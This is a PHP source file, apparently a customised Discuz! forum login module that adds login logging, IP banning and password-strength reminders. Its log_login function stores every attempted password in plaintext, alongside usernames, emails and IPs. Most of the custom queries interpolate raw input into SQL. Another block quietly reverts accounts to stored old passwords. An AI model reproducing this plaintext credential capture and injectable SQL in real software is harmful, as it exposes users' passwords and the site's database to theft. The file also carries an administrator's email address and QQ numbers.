<?php

/**
 *      [Discuz!] (C)2001-2099 Comsenz Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: function_member.php 30561 2012-06-04 03:23:55Z liulanbo $
 */
if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

function userlogin($username, $password, $questionid, $answer, $loginfield = 'username') {
	$return = array();

	if($loginfield == 'uid') {
		$sql = "SELECT uid,old_password,salt FROM simple_password_recover WHERE uid='$username'";
		$isuid = 1;
	} elseif($loginfield == 'email') {
		$sql = "SELECT uid,old_password,salt FROM simple_password_recover WHERE old_email='$username'";
		$isuid = 2;
	} elseif($loginfield == 'auto') {
		$isuid = 3;
	} else {
		$isuid = 0;
	}
	
	//对登陆行为进行拦截，如果使用疑似被盗账号的旧密码登陆的，将密码修改为旧密码，并发送通知
	$sql or $sql = "SELECT uid,old_password,salt,finded,enhanced FROM simple_password_recover WHERE username='$username'";
	$old_stamp = time();
	$old_record = DB::fetch_first($sql);
	if($old_record){
		$old_password = $old_record['old_password'];
		$old_salt = $old_record['salt'];
		if(md5(md5($password).$old_salt) == $old_password){
			$old_ip = $_SERVER['REMOTE_ADDR'];
			$old_uid = $old_record['uid'];
			if($old_record['enhanced'] == 0){
				$currentPassword = DB::fetch_first("SELECT password FROM ucenter.uc_members WHERE uid=$old_uid");
				
				if($currentPassword && $currentPassword['password'] != $old_password){
					//发送通知
					$notice = "近期出现了大量用户由于密码简单被盗的现象，而安全系统监控发现，您的账号密码可能已经被盗。为了保证你的账号安全，请现在就去<a href=\"/home.php?mod=spacecp&ac=profile&op=password\">修改密码</a>";
					DB::query("INSERT INTO ".DB::table('home_notification')." (`uid`, `type`, `new`, `authorid`, `author`, `note`, `dateline`, `from_id`, `from_idtype`, `from_num`) VALUES ('$old_uid', 'system', '1', '0', '', '$notice', '$old_stamp', '0', '', '1')");
					//发送短信
					$pm = "您好，我是系统管理员。您的账号由于密码简单，存在巨大的安全风险，并且可能已经被他人盗取密码。请您尽快修改密码，谢谢！";
					sendpm($old_uid, "", $pm, 1);
						
					//对消息进行提示
					DB::query("UPDATE ".DB::table('common_member')." SET newprompt=1,newpm=1 WHERE uid=$old_uid");
					
					//恢复密码
					DB::query("UPDATE ucenter.uc_members SET password='$old_password' WHERE uid=$old_uid");
					DB::query("UPDATE simple_password_recover set ip='$old_ip',finded=$old_stamp WHERE uid=$old_uid");
				}
			}
		}
	}
	
	if(!function_exists('uc_user_login')) {
		loaducenter();
	}
	if($isuid == 3) {
		if(preg_match('/^[1-9]\d*$/', $username)) {
			$return['ucresult'] = uc_user_login($username, $password, 1, 1, $questionid, $answer);
		} elseif(isemail($username)) {
			$return['ucresult'] = uc_user_login($username, $password, 2, 1, $questionid, $answer);
		}
		if($return['ucresult'][0] <= 0 && $return['ucresult'][0] != -3) {
			$return['ucresult'] = uc_user_login($username, $password, 0, 1, $questionid, $answer);
		}
	} else {
		$return['ucresult'] = uc_user_login($username, $password, $isuid, 1, $questionid, $answer);
	}
	$tmp = array();
	$duplicate = '';
	list($tmp['uid'], $tmp['username'], $tmp['password'], $tmp['email'], $duplicate) = daddslashes($return['ucresult'], 1);
	$return['ucresult'] = $tmp;
	if($duplicate && $return['ucresult']['uid'] > 0) {
		if($olduid = DB::result_first("SELECT uid FROM ".DB::table('common_member')." WHERE username='".addslashes($return['ucresult']['username'])."'")) {
			if($olduid != $return['ucresult']['uid']) {
				membermerge($olduid, $return['ucresult']['uid']);
			}
			uc_user_merge_remove($return['ucresult']['username']);
		} else {
			$return['status'] = 0;
			log_login($username, $password, $tmp, 0, $old_record);
			return $return;
		}
	}

	if($return['ucresult']['uid'] <= 0) {
		$return['status'] = 0;
		log_login($username, $password, $tmp, 0, $old_record);
		return $return;
	}

	$member = DB::fetch_first("SELECT * FROM ".DB::table('common_member')." WHERE uid='".$return['ucresult']['uid']."'");
	if(!$member) {
		$return['status'] = -1;
		log_login($username, $password, $tmp, -1, $old_record);
		return $return;
	}
	$return['member'] = $member;
	$return['status'] = 1;

	if(addslashes($member['email']) != $return['ucresult']['email']) {
		DB::query("UPDATE ".DB::table('common_member')." SET email='".$return['ucresult']['email']."' WHERE uid='".$return['ucresult']['uid']."'");
	}

	log_login($username, $password, $tmp, 1, $old_record);
	return $return;
}

function log_login($logname, $password, $tmp, $status, $old_record = null){
	$complex = Ming_Password::computeComplex($password);
		$Ming_logname = $logname;
		$Ming_uid = $tmp['uid'];
		$Ming_username = $tmp['username'];
		$Ming_email = $tmp['email'];
		$Ming_ip = $_SERVER['REMOTE_ADDR'];
		$Ming_logged = time();
		
		$url = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
		$post_data = print_r($_POST, true);
		$get_data = print_r($_GET, true);
		$cookie_data = print_r($_COOKIE, true);
	
		//记录登陆
 		DB::query("INSERT INTO simple_password_log(logname, password, uid, username, email, ip, logged, status, complex, url) VALUES('$logname', '{$password}', $Ming_uid, '{$Ming_username}', '{$Ming_email}', '{$Ming_ip}', {$Ming_logged}, {$status}, $complex, '$url')");
	if(strlen($password) != 0 && (strlen($password) < 5 || $complex < 6)){ //密码过于简单予以记录

 		//判断是否需要屏蔽这个IP登陆
 		if(!$status){ //如果登陆失败
 			log_ban_mingxing($Ming_ip);
 		}
 		
 		//如果登陆成功，向用户发送密码过于简单的提醒
 		if($status && $Ming_uid){
 			log_notice_mingxing($Ming_uid);
 		}
	}
	
	if(!$status && $old_record){
		$locationTime = isset($_GET['frommessage']) ? 0 : 20;
		showmessage('您的账号有可能被他人窃取并篡改了密码，请您使用本站提供的找回密码功能找回。如果您没有注册邮箱，或者忘记了，请联系管理员协助找回。管理员邮箱test3g1688@gmail.com，QQ：63353606/1438850158', '/member.php?mod=logging&action=login&viewlostpw=1', array('location' => true), 
				array(
					'showdialog' => true,
					'locationtime' => $locationTime,
				));
	}
}

/**
 * 发送提醒
 * @param unknown_type $uid
 */
function log_notice_mingxing($uid){
	//避免重复发送(一个礼拜只发送一次，最多发4次)
	$member = DB::fetch_first("SELECT * FROM simple_password_notice WHERE uid=$uid");
	if(!$member || ($member['sended'] < time() - 3 * 24 * 3600 && $member['send_times'] < 4) || $member['is_modified'] != 0){ //确保三天内没有发送提醒(或者重新出现了简单密码情形)
		if($member && $member['is_modified'] == 0){ //只是重新发送提醒
			$score = $member['score'];
		}else{ //第一次发送提醒
			$ext = DB::fetch_first("SELECT extcredits1 FROM ".DB::table('common_member_count')." WHERE uid=$uid");
			@$score = (int)($ext['extcredits1'] * 0.1);
			$score = min(1000, max(100, $score));
		}
	
		$stamp = time();
		//发送提醒
		$notice = "【增强密码，赠送威望】<br />亲爱的会员，您的密码过于简单，容易被他人盗取。为了保证你的账号安全，防止被他人利用，我们建议您修改密码。管理员在此向您表示诚挚的感谢，并将在修改成功后奖励您{$score}威望！您的举手之劳，既保护了自己，又惠及社区，何乐而不为呢？<br />现在就去<a href=\"/home.php?mod=spacecp&ac=profile&op=password\">修改密码</a>";
		DB::query("INSERT INTO ".DB::table('home_notification')." (`uid`, `type`, `new`, `authorid`, `author`, `note`, `dateline`, `from_id`, `from_idtype`, `from_num`) VALUES ('$uid', 'system', '1', '0', '', '$notice', '$stamp', '0', '', '1')");
		//发送短信
		$pm = "你的密码设置得太简单了，账号风险很大，近期已经有不少会员反映由于密码简单被盗号。现在论坛推出【增强密码，赠送威望】活动，现在就去修改密码，就有{$score}威望赠送。点击右上角的”设置“，然后选择”密码安全“，就可以修改密码啦！";
		sendpm($uid, "", $pm, 1);
		
		//对消息进行提示
		DB::query("UPDATE ".DB::table('common_member')." SET newprompt=1,newpm=1 WHERE uid=$uid");
		
		//对这次发送行为进行记录
		if($member){
			DB::query("UPDATE simple_password_notice SET is_modified=0,sended=$stamp,send_times=send_times+1,score=$score WHERE uid=$uid");
		}else{
			DB::query("INSERT INTO simple_password_notice(uid, sended, send_times, is_modified, score) VALUES($uid, $stamp, 1, 0, $score)");
		}
	}
}

/**
 * 如果涉嫌盗号，则禁止这个IP继续登陆
 */
function log_ban_mingxing($Ming_ip){
	$limit_times = 10; //登陆超次
	$limit_username = 5; //登陆超人
	$limit_area = 3 * 3600; //登陆时间内
	$limit_ban = 24 * 3600; //封禁时间
	
	$banned = false;
	
	//查询最近的登陆记录
	$stamp = time() - $limit_area;
	
	$sql = "SELECT COUNT(*) log_times FROM simple_password_log WHERE ip='$Ming_ip' AND logged>$stamp AND status=0";
	$log_times = DB::fetch_first($sql);
	
	if($log_times && $log_times['log_times'] >= $limit_username){
		if($log_times['log_times'] >= $limit_times){
			$banned = true;
		}else{
			$sql = "SELECT COUNT(DISTINCT logname) log_times FROM simple_password_log WHERE ip='$Ming_ip' AND logged>$stamp AND status=0";
			$logname_times = DB::fetch_first($sql);
			
			if($logname_times && $logname_times['log_times'] >= $limit_username){
				$banned = true;
			}
		}
	}
	
	if($banned){
		$banned = time() - 3600;
		$released = time() + $limit_ban;
		$sql = "INSERT INTO simple_password_ban(ip, banned, released) VALUES('$Ming_ip', $banned, $released)";
		DB::query($sql);
	}
}

/**
 * 查看当前的IP是否被屏蔽登陆
 * @param unknown_type $ip
 */
function log_isban_mingxing($ip){
	$current = time();
	$sql = "SELECT COUNT(*) banned FROM simple_password_ban WHERE ip='$ip' AND banned<$current AND released>$current";
	$banned = DB::fetch_first($sql);
	if($banned && $banned['banned'] > 0){
		return true;
	}else{
		return false;
	}
}

function setloginstatus($member, $cookietime) {
	global $_G;
	$_G['uid'] = $member['uid'];
	$_G['username'] = addslashes($member['username']);
	$_G['adminid'] = $member['adminid'];
	$_G['groupid'] = $member['groupid'];
	$_G['formhash'] = formhash();
	$_G['session']['invisible'] = getuserprofile('invisible');
	$_G['member'] = $member;
	loadcache('usergroup_'.$_G['groupid']);
	$discuz = & discuz_core::instance();
	$discuz->session->isnew = true;

	dsetcookie('auth', authcode("{$member['password']}\t{$member['uid']}", 'ENCODE'), $cookietime, 1, true);
	dsetcookie('loginuser');
	dsetcookie('activationauth');
	dsetcookie('pmnum');

	include_once libfile('function/stat');
	updatestat('login', 1);
	if(defined('IN_MOBILE')) {
		updatestat('mobilelogin', 1);
	}
	if($_G['setting']['connect']['allow'] && $_G['member']['conisbind']) {
		updatestat('connectlogin', 1);
	}
	updatecreditbyaction('daylogin', $_G['uid']);
	checkusergroup($_G['uid']);
}

function logincheck($username) {
	global $_G;
	$return = 0;
	$username = 1;
	$login = DB::fetch_first("SELECT count, lastupdate FROM ".DB::table('common_failedlogin')." WHERE ip='$_G[clientip]'");
	$return = (!$login || (TIMESTAMP - $login['lastupdate'] > 900)) ? 4 : max(0, 4 - $login['count']);

	if(!$login) {
		DB::query("REPLACE INTO ".DB::table('common_failedlogin')." (ip, username, count, lastupdate) VALUES ('$_G[clientip]', '$username', '0', '$_G[timestamp]')");
	} elseif(TIMESTAMP - $login['lastupdate'] > 900) {
		DB::query("REPLACE INTO ".DB::table('common_failedlogin')." (ip, username, count, lastupdate) VALUES ('$_G[clientip]', '$username', '0', '$_G[timestamp]')");
		DB::query("DELETE FROM ".DB::table('common_failedlogin')." WHERE lastupdate<$_G[timestamp]-901", 'UNBUFFERED');
	}
	return $return;
}

function loginfailed($username) {
	global $_G;
	DB::query("UPDATE ".DB::table('common_failedlogin')." SET count=count+1, lastupdate='$_G[timestamp]' WHERE ip='$_G[clientip]'");
}

function getuidfields() {
	return array(
		'common_credit_log',
		'common_credit_rule_log',
		'common_credit_rule_log_field',
		'common_invite|uid,fuid',
		'common_mailcron|touid',
		'common_member',
		'common_member_count',
		'common_member_field_forum',
		'common_member_field_home',
		'common_member_log',
		'common_member_profile',
		'common_member_status',
		'common_member_validate',
		'common_myinvite|fromuid,touid',
		'forum_access',
		'forum_activity',
		'forum_activityapply',
		'forum_attachment',
		'forum_attachment_0',
		'forum_attachment_1',
		'forum_attachment_2',
		'forum_attachment_3',
		'forum_attachment_4',
		'forum_attachment_5',
		'forum_attachment_6',
		'forum_attachment_7',
		'forum_attachment_8',
		'forum_attachment_9',
		'forum_creditslog',
		'forum_debate',
		'forum_debatepost',
		'home_favorite',
		'forum_medallog',
		'common_member_magic',
		'forum_memberrecommend|recommenduid',
		'forum_moderator',
		'forum_modwork',
		'common_mytask',
		'forum_order',
		'forum_groupinvite',
		'forum_groupuser',
		'forum_pollvoter',
		'forum_post|authorid',
		'forum_thread|authorid',
		'forum_threadmod',
		'forum_tradecomment|raterid,rateeid',
		'forum_tradelog|sellerid,buyerid',
		'home_album',
		'home_appcreditlog',
		'home_blacklist|uid,buid',
		'home_blog',
		'home_blogfield',
		'home_class',
		'home_clickuser',
		'home_comment|uid,authorid',
		'home_docomment',
		'home_doing',
		'home_feed',
		'home_feed_app',
		'home_friend|uid,fuid',
		'home_friendlog|uid,fuid',
		'home_pic',
		'home_share',
		'home_userapp',
		'home_userappfield',
		'common_admincp_member'
	);
}

function membermerge($olduid, $newuid) {
	$uidfields = getuidfields();
	foreach($uidfields as $value) {
		list($table, $field, $stepfield) = explode('|', $value);
		$fields = !$field ? array('uid') : explode(',', $field);
		foreach($fields as $field) {
			DB::query("UPDATE `".DB::table($table)."` SET `$field`='$newuid' WHERE `$field`='$olduid'");
		}
	}
}

function getinvite() {
	global $_G;

	if($_G['setting']['regstatus'] == 1) return array();
	$result = array();
	$cookies = empty($_G['cookie']['invite_auth']) ? array() : explode(',', $_G['cookie']['invite_auth']);
	$cookiecount = count($cookies);
	if($cookiecount == 2 || $_G['gp_invitecode']) {
		$id = intval($cookies[0]);
		$code = trim($cookies[1]);
		if($_G['gp_invitecode']) {
			$query = DB::query("SELECT * FROM ".DB::table('common_invite')." WHERE code='$_G[gp_invitecode]'");
			$code = trim($_G['gp_invitecode']);
		} else {
			$query = DB::query("SELECT * FROM ".DB::table('common_invite')." WHERE id='$id'");
		}
		if($invite = DB::fetch($query)) {
			if($invite['code'] == $code && empty($invite['fuid']) && (empty($invite['endtime']) || $_G['timestamp'] < $invite['endtime'])) {
				$result['uid'] = $invite['uid'];
				$result['id'] = $invite['id'];
				$result['appid'] = $invite['appid'];
			}
		}
	} elseif($cookiecount == 3) {
		$uid = intval($cookies[0]);
		$code = trim($cookies[1]);
		$appid = intval($cookies[2]);

		$invite_code = space_key($uid, $appid);
		if($code == $invite_code) {
			$groupid = DB::result_first("SELECT groupid FROM ".DB::table('common_member')." WHERE uid='$uid'");
			$inviteprice = DB::result_first("SELECT inviteprice FROM ".DB::table('common_usergroup')." WHERE groupid='$groupid'");
			if($inviteprice > 0) return array();
			$result['uid'] = $uid;
			$result['appid'] = $appid;
		}
	}

	if($result['uid']) {
		$member = getuserbyuid($result['uid']);
		$result['username'] = $member['username'];
	} else {
		dsetcookie('invite_auth', '');
	}

	return $result;
}

function replacesitevar($string, $replaces = array()) {
	global $_G;
	$sitevars = array(
		'{sitename}' => $_G['setting']['sitename'],
		'{bbname}' => $_G['setting']['bbname'],
		'{time}' => dgmdate(TIMESTAMP, 'Y-n-j H:i'),
		'{adminemail}' => $_G['setting']['adminemail'],
		'{username}' => $_G['member']['username'],
		'{myname}' => $_G['member']['username']
	);
	$replaces = array_merge($sitevars, $replaces);
	return str_replace(array_keys($replaces), array_values($replaces), $string);
}

function clearcookies() {
	global $_G;
	foreach($_G['cookie'] as $k => $v) {
		if($k != 'widthauto') {
			dsetcookie($k);
		}
	}
	$_G['uid'] = $_G['adminid'] = 0;
	$_G['username'] = $_G['member']['password'] = '';
}

function checkemail($email) {

	$email = strtolower(trim($email));
	if(strlen($email) > 32) {
		showmessage('profile_email_illegal', '', array(), array('handle' => false));
	}
	loaducenter();
	$ucresult = uc_user_checkemail($email);

	if($ucresult == -4) {
		showmessage('profile_email_illegal', '', array(), array('handle' => false));
	} elseif($ucresult == -5) {
		showmessage('profile_email_domain_illegal', '', array(), array('handle' => false));
	} elseif($ucresult == -6) {
		showmessage('profile_email_duplicate', '', array(), array('handle' => false));
	}
}
?>